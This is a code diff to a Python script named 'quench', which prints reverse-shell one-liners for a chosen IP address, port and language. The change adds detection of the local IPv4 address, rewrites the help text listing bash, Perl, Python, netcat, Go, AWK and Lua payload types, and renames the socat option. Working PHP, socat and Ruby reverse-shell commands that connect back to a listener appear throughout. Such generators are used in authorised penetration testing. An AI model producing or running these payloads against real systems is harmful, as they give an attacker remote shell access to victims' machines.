@@ -1,20 +1,25 @@
-#!/usr/bin/env python
+#!/usr/bin/python3
 import sys
 import getopt
+import subprocess
 
 def main(argv):
-   help = """Usage: quench -i, --ip <IP Address> -p, --port <Port Number> -t, --type <Payload Type>\nPayload Types: sh, pl, py, socat, php, rb, nc, go, awk, lua"""
+   help = """Arguments:\n  -i, --ip ==> IP Address\n  -p, --port ==> Port Number\n  -t, --type ==> Payload Type\nUsage:\n  quench -i <IP Address> -p <Port Number> -t <Payload Type>\n  quench -i 127.0.0.1 -p 4444 -t php\n  quench --ip 192.168.1.1 --port 1337 --type awk\nPayload Types:\n  Bash ==> sh\n  Perl ==> pl\n  Python ==> py\n  Socat ==> sc\n  PHP ==> php\n  Ruby ==> rb\n  Netcat ==> nc\n  Golang ==> go\n  AWK ==> awk\n  LUA ==> lua"""
    ip = ''
    port = ''
    type = ''
-
+   getipv4 = subprocess.Popen("hostname -I | awk '{print $1}'", shell=True, stdout=subprocess.PIPE).stdout
+   ipv4 = getipv4.read()
+   
    if len(sys.argv) == 1:
     print(help)
-
+    print("Your IPv4 Address ==>", ipv4[:-1].decode())
+      
    try:
       opts, args = getopt.getopt(argv,"i:p:t:",["ip=","port=","type="])
    except getopt.GetoptError:
       print(help)
+      print("Your IPv4 Address ==>", ipv4[:-1].decode())
       sys.exit(2)
 
    for opt, arg in opts:
@@ -46,7 +51,7 @@ def main(argv):
             print("""PHP ==> php -r '$sock=fsockopen("%s",%s);passthru("/bin/sh -i <&3 >&3 2>&3");'""" %(ip,port))
             print("""PHP ==> php -r '$sock=fsockopen("%s",%s);popen("/bin/sh -i <&3 >&3 2>&3", "r");'""" %(ip,port))
             print("""PHP ==> php -r '$sock=fsockopen("%s",%s);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'""" %(ip,port))
-        elif type == "socat":
+        elif type == "sc":
             print("""SOCAT ==> socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%s:%s""" %(ip,port))
         elif type == "rb":
             print("""RUBY ==> ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["%s"],ENV["%s"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end' """ %(ip,port))
